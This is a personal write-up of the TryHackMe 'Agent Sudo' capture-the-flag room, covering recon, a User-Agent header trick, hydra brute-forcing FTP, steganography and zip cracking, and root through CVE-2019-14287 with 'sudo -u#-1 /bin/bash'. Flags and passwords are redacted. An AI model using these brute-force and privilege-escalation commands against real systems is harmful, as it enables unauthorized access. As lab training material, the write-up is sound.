---
layout: post
title: "Agent Sudo - TryHackMe CTF Writeup"
date: 2026-09-11
difficulty: easy
room: agentsudoctf
description: "A deep-sea spy box - a user-agent door, hydra, a stego trail that carries the whole credential chain, and a real firing of CVE-2019-14287 for root."
tags: [tryhackme, ctf, agent-sudo, stego, privesc]
author: zew0z
---

# Agent Sudo - TryHackMe CTF

A secret server under the deep sea, a room literally named after sudo, and a privesc CVE I got to fire for real instead of just reading about. Also the first box where steganography carried the entire credential chain - three separate passwords, each hidden one layer deeper.
Note: like always, I'm leaving the actual flags and passwords out of this writeup so I don't spoil the room for anyone.
[Link for the CTF](https://tryhackme.com/room/agentsudoctf)

---

## Recon

Full nmap scan, standard setup:

```text
zero ❯ nmap -sC -sV <machine-ip>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
```

Three ports. FTP was my first instinct - after Bounty Hacker I go straight for anonymous login. This server laughed at me:

```text
zero ❯ ftp <machine-ip>
Name (<machine-ip>:zew0z): anonymous
331 Please specify the password.
530 Login incorrect.
ftp: Login failed.
```

No anonymous FTP this time. The website is one dramatic page titled "Annoucement" (typo included, it's part of the charm):

![](/assets/img/agent-sudo/thm-agent-sudo-webpage.png)

## The user-agent door

The page reads like a spy movie note: "Use your own **codename** as user-agent to access the site. From, Agent R."

Here's my honest fail: I skimmed it as "username" and spent a while planning how to brute-force usernames through a form that doesn't exist. It says **codename**, and it says to send it as a **user-agent** - the HTTP header, not a login field. I had the right idea early and then almost ignored it because I read the sentence wrong.

So, curl with a custom User-Agent:

```text
zero ❯ curl -H "User-Agent:C" http://<machine-ip>/
Attention chris,
Do you still remember our deal? Please tell agent J about...
From, Agent R
```

Codenames are single letters here. Agent R's note signed with R, so C was a fair first guess - and it paid out a name: **chris**. That's a username, served voluntarily, same rule as task.txt in Bounty Hacker: whoever signs the notes probably has an account.

![](/assets/img/agent-sudo/thm-agent-sudo-user-agent-c.png)

## Hydra vs FTP

chris + rockyou + the FTP port from recon:

```text
zero ❯ hydra -l chris -P /usr/share/dict/rockyou.txt <machine-ip> ftp
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398)
[DATA] attacking ftp://<machine-ip>:21/
[21][ftp] host: <machine-ip>   login: chris
1 of 1 target successfully completed, 1 valid password found
```

Full rockyou, 14 million candidates, done in under a minute. The password itself stays redacted, obviously. (The hydra banner calling me "non-binding" remains my favorite legal disclaimer in software.)

In as chris, the FTP share holds three files: a note `To_agentJ.txt`, and two images, `cute-alien.jpg` and `cutie.png`. The note sets the mission: the alien photos are fake, the real picture is hidden inside, and "your login password is somehow stored in the fake picture." Cool. Cool cool cool.

## The stego trail

This is where the room went from "easy box" to "actual detective work." My progression, fail beats included:

- `strings` on both images: nothing. Just image noise.
- I even renamed them to `.txt` and poked around, as if the extension was the problem. It was not.
- I knew there was a zip somewhere in this room's story. I had not found one.

`binwalk` on `cutie.png` saw... a PNG. One entry, and when I asked it to extract, it politely declined:

```text
zero ❯ binwalk cutie.png
DECIMAL       HEXADECIMAL   DESCRIPTION
0             0x0           PNG image, total size: 34562 bytes

zero ❯ binwalk -e cutie.png
[#] Extraction of png data at offset 0x0 declined
```

The tool that finally saw it was `7z`:

```text
zero ❯ 7z l cutie.png
Type = zip
Offset = 34562
Physical Size = 280
Files: To_agentR.txt
```

A zip appended **after** the PNG's declared size - a polyglot file that is a valid image and a valid archive at once. Binwalk scans signatures and mostly looks at what it recognizes; `7z l` just lists what's actually packed in there. Lesson logged.

Carve it out with `dd` and hand it to john:

```text
zero ❯ dd if=cutie.png of=cutie.zip bs=1 skip=34562
zero ❯ zip2john cutie.zip > cutie-hash.txt
zero ❯ john --format=ZIP-opencl cutie-hash.txt --show
cutie.zip/To_agentR.txt:[redacted]
```

(`unzip` had refused the archive with a "need PK compat v5.1" error - john's zip format handles it fine. The password is redacted like everything else.)

Inside the zip, `To_agentR.txt`: "We need to send the picture to [a short base64-looking string] as soon as possible!" Decode that string (redacted - it spells the next password) and you have a passphrase with no lock. Yet.

The lock is `cute-alien.jpg`, and the keyhole is steghide. Real talk about how I got there: I searched "steg password", a Kali tool came up, and I genuinely was not sure I had it installed - turns out I did, and it worked on the first try:

```text
zero ❯ echo "<redacted>" > password.txt
zero ❯ steghide --crack --wordlist password.txt cute-alien.jpg
[i] Found passphrase: [redacted]
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```

`cute-alien.jpg.out` is a note to james - Agent J - containing his SSH password (redacted, as always). The chain was: FTP password hidden behind a user-agent trick, a zip password inside a PNG polyglot, and the SSH password inside a JPEG stego. Three locks, three keys, none of them lying in the open.

## James and the incident

```text
zero ❯ ssh james@<machine-ip>
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
```

User flag captured - not printed here. Alongside it sits `Alien_autospy.jpg`, and the room asks what incident the photo is from. Reverse image search says... ew. It's a still from the famous **Roswell alien autopsy** hoax footage, the 1995 pseudo-documentary that fooled a lot of television audiences.

![](/assets/img/agent-sudo/thm-agent-sudo-alien-autopsy.png)

![](/assets/img/agent-sudo/thm-agent-sudo-incident-search.png)

## Root via CVE-2019-14287

The room's namesake move. `sudo -l` as james:

```text
james@agent-sudo:~$ sudo -l
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

james@agent-sudo:~$ sudo /bin/bash
Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
```

`(ALL, !root)` is a **blacklist**: james may run bash as any user *except* root. Blacklists age badly. This exact shape is [CVE-2019-14287](https://www.exploit-db.com/exploits/47502) (sudo < 1.8.28): if you name the target user as `#-1`, sudo's integer parsing wraps around and the command executes with uid 0 anyway. I skipped the exploit script and typed the one-liner by hand - it's one argument:

```text
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:/root#
```

Root shell. Root flag captured, redacted as always. Nice touch: the root note is signed "DesKel a.k.a Agent R" - the room author has been playing Agent R the whole time.

## What I Learned

- **Read the hint twice.** "codename as user-agent" and "codename as username" are different exploits, and I nearly built tooling for the wrong one
- **`7z l` catches polyglots that binwalk shrugs at.** When a file "is only a PNG," list what the archive layer thinks instead of trusting the signature scan
- **Stego can carry a whole credential chain** on an easy box: image → zip → image → password. If a room hands you two pictures and a story about fake photos, budget real time for stego
- **`(ALL, !root)` is a blacklist, and blacklist + integer parsing = CVE-2019-14287.** `sudo -u#-1` is a one-argument root shell on unpatched sudo
- `john --show` after a crack saves a re-run; `zip2john` handles zip features plain `unzip` refuses

---

**If you're trying this room too and get stuck, feel free to DM me or just throw commands at the wall like I did - eventually something sticks.**
